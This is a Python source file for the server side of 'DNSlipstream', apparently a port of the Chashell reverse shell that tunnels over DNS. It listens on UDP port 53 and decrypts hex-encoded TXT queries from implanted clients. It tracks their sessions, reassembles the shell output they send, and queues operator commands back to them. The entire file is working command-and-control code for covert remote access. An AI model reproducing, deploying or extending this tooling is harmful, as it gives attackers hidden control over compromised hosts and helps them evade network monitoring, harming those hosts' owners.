# server.py
import sys
import os
import time
import threading
from collections import defaultdict
from datetime import datetime
import binascii

from dnslib import DNSRecord, DNSHeader, RR, TXT, QTYPE
from dnslib.server import DNSServer, BaseResolver

from lib.crypto.symetric import open_sealed
from lib.protocol import comm_pb2
from lib.logging import printf, println
from cmd.server import cli


sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../..')))

# Try to import embedded config first
try:
    from lib.config_embedded import ENCRYPTION_KEY as EMBEDDED_KEY
    from lib.config_embedded import DOMAIN_NAME as EMBEDDED_DOMAIN
except ImportError:
    EMBEDDED_KEY = None
    EMBEDDED_DOMAIN = None

# Get from environment or embedded config
TARGET_DOMAIN = os.getenv('DOMAIN_NAME') or EMBEDDED_DOMAIN or 'c.example.com'
ENCRYPTION_KEY = os.getenv('ENCRYPTION_KEY') or EMBEDDED_KEY or ''

# Validate
if not ENCRYPTION_KEY:
    print("ERROR: ENCRYPTION_KEY not set!")
    print("\nOptions:")
    print("  1. Build with embedded key:")
    print("     python build_binaries.py all --domain c.example.com")
    print("  2. Or set environment variable:")
    print("     export ENCRYPTION_KEY=$(python3 -c 'from os import urandom; print(urandom(32).hex())')")
    sys.exit(1)

if len(ENCRYPTION_KEY) != 64:
    print(f"ERROR: Invalid key length: {len(ENCRYPTION_KEY)} (expected 64)")
    sys.exit(1)

print(f"=== DNSlipstream Server ===")

# Share state with CLI module
cli.encryption_key = ENCRYPTION_KEY
cli.target_domain = TARGET_DOMAIN
cli.current_session = None
cli.console_buffer = {}
cli.packet_queue = {}
cli.sessions_map = {}


class ClientInfo:
    """Store client session information."""
    
    def __init__(self):
        self.hostname = "unknown"
        self.heartbeat = time.time()
        self.lock = threading.Lock()
        self.conn = {}  # {chunk_id: ConnData}


class ConnData:
    """Store connection chunk data."""
    
    def __init__(self, chunk_size):
        self.chunk_size = chunk_size
        self.nonce = None
        self.packets = {}  # {chunk_num: data}


class PollTemporaryData:
    """Temporary storage for poll queries."""
    
    def __init__(self, data):
        self.lastseen = time.time()
        self.data = data


# Global caches
poll_cache = {}


class ChashellResolver(BaseResolver):
    """DNS resolver for Chashell protocol."""
    
    def resolve(self, request, handler):
        """Handle DNS request."""
        reply = request.reply()
        
        # Process each question in the request
        for question in request.questions:
            qname = str(question.qname)
            qtype = question.qtype
            
            # Only handle TXT queries
            if qtype == QTYPE.TXT:
                answer = self.parse_query(qname)
                reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT(answer)))
        
        return reply
    
    def parse_query(self, qname):
        """Parse and process DNS query."""
        try:
            # Strip the target domain and all dots
            data_packet = qname.replace(TARGET_DOMAIN, '').replace('.', '').rstrip('.')
            
            # Hex-decode the packet
            try:
                data_packet_raw = binascii.unhexlify(data_packet)
            except (binascii.Error, ValueError) as e:
                printf(f"Unable to decode data packet: {data_packet}\n")
                return "-"
            
            # Check minimum packet size (24 bytes for nonce)
            if len(data_packet_raw) < 24:
                return "-"
            
            # Decrypt and authenticate the packet
            nonce = data_packet_raw[:24]
            ciphertext = data_packet_raw[24:]
            output, valid = open_sealed(ciphertext, nonce, ENCRYPTION_KEY)
            
            if not valid:
                printf("Received invalid/corrupted packet. Dropping.\n")
                return "-"
            
            # Parse protobuf message
            message = comm_pb2.Message()
            try:
                message.ParseFromString(output)
            except Exception as e:
                printf(f"Failed to parse message packet: {e}\n")
                return "-"
            
            # Get client GUID
            client_guid = binascii.hexlify(message.clientguid).decode('ascii')
            
            if not client_guid:
                println("Invalid packet: empty clientGUID!")
                return "-"
            
            # Check if session exists, create if new
            if client_guid not in cli.sessions_map:
                printf(f"New session : {client_guid}\n")
                cli.sessions_map[client_guid] = ClientInfo()
                cli.console_buffer[client_guid] = []
            
            session = cli.sessions_map[client_guid]
            
            # Lock session to avoid race conditions
            with session.lock:
                # Update heartbeat
                session.heartbeat = time.time()
                
                # Process message based on type
                if message.HasField('pollquery'):
                    return self.handle_poll_query(client_guid, data_packet_raw)
                
                elif message.HasField('infopacket'):
                    session.hostname = message.infopacket.hostname.decode('utf-8', errors='ignore')
                
                elif message.HasField('chunkstart'):
                    self.handle_chunk_start(session, message.chunkstart)
                
                elif message.HasField('chunkdata'):
                    self.handle_chunk_data(session, message.chunkdata, client_guid)
        
        except Exception as e:
            printf(f"Error processing query: {e}\n")
        
        return "-"
    
    def handle_poll_query(self, client_guid, data_packet_raw):
        """Handle poll query from client."""
        # Check cache for duplicate queries
        cache_key = data_packet_raw.hex()
        if cache_key in poll_cache:
            println("Duplicated poll query received.")
            return poll_cache[cache_key].data
        
        # Check if we have data to send
        if client_guid in cli.packet_queue and len(cli.packet_queue[client_guid]) > 0:
            answer = cli.packet_queue[client_guid][0]
            # Cache the answer
            poll_cache[cache_key] = PollTemporaryData(answer)
            # Dequeue
            cli.packet_queue[client_guid] = cli.packet_queue[client_guid][1:]
            return answer
        
        return "-"
    
    def handle_chunk_start(self, session, chunkstart):
        """Handle chunk start message."""
        chunk_id = chunkstart.chunkid
        
        # Ignore duplicates
        if chunk_id in session.conn:
            printf(f"Ignoring duplicated Chunkstart: {chunk_id}\n")
            return
        
        # Allocate new connection data
        session.conn[chunk_id] = ConnData(chunkstart.chunksize)
    
    def handle_chunk_data(self, session, chunkdata, client_guid):
        """Handle chunk data message."""
        chunk_id = chunkdata.chunkid
        
        # Get connection data
        if chunk_id not in session.conn:
            return
        
        connection = session.conn[chunk_id]
        chunk_num = chunkdata.chunknum
        
        # Ignore duplicates
        if chunk_num in connection.packets:
            printf(f"Ignoring duplicated Chunkdata: {chunkdata}\n")
            return
        
        # Store packet
        connection.packets[chunk_num] = chunkdata.packet
        
        # Check if all packets received
        if len(connection.packets) == connection.chunk_size:
            # Rebuild data in order
            data_parts = []
            for i in range(connection.chunk_size):
                if i in connection.packets:
                    data_parts.append(connection.packets[i])
            
            complete_data = b''.join(data_parts)
            
            # Output to console or buffer
            if cli.current_session == client_guid:
                print(complete_data.decode('utf-8', errors='ignore'), end='')
            else:
                if client_guid not in cli.console_buffer:
                    cli.console_buffer[client_guid] = []
                cli.console_buffer[client_guid].append(complete_data.decode('utf-8', errors='ignore'))
            
            # Clean up connection
            del session.conn[chunk_id]


def timeout_checker():
    """Check for timed-out sessions."""
    while True:
        time.sleep(1)
        now = time.time()
        
        # Check sessions
        sessions_to_remove = []
        for client_guid, session in cli.sessions_map.items():
            if session.heartbeat + 30 < now:
                printf(f"Client timed out [{client_guid}].\n")
                sessions_to_remove.append(client_guid)
        
        # Remove timed out sessions
        for client_guid in sessions_to_remove:
            del cli.sessions_map[client_guid]
            if client_guid in cli.packet_queue:
                del cli.packet_queue[client_guid]
            if client_guid in cli.console_buffer:
                del cli.console_buffer[client_guid]


def poll_cache_cleaner():
    """Clean old poll cache entries."""
    while True:
        time.sleep(1)
        now = time.time()
        
        # Check cache entries
        cache_to_remove = []
        for poll_data, cache in poll_cache.items():
            if cache.lastseen + 10 < now:
                printf(f"Dropping cached poll query\n")
                cache_to_remove.append(poll_data)
        
        # Remove old entries
        for poll_data in cache_to_remove:
            del poll_cache[poll_data]


def main():
    """Main server function."""
    if not TARGET_DOMAIN or not ENCRYPTION_KEY:
        print("Error: TARGET_DOMAIN and ENCRYPTION_KEY must be set")
        sys.exit(1)
    
    print(f"Starting Chashell Server")
    print(f"Target Domain: {TARGET_DOMAIN}")
    print(f"Listening on UDP port 53\n")
    
    # Start DNS server in background thread
    resolver = ChashellResolver()
    dns_server = DNSServer(resolver, port=53, address="0.0.0.0")
    
    dns_thread = threading.Thread(target=dns_server.start, daemon=True)
    dns_thread.start()
    
    # Start timeout checker
    timeout_thread = threading.Thread(target=timeout_checker, daemon=True)
    timeout_thread.start()
    
    # Start poll cache cleaner
    cache_thread = threading.Thread(target=poll_cache_cleaner, daemon=True)
    cache_thread.start()
    
    # Run CLI
    cli.run_cli()


if __name__ == "__main__":
    main()
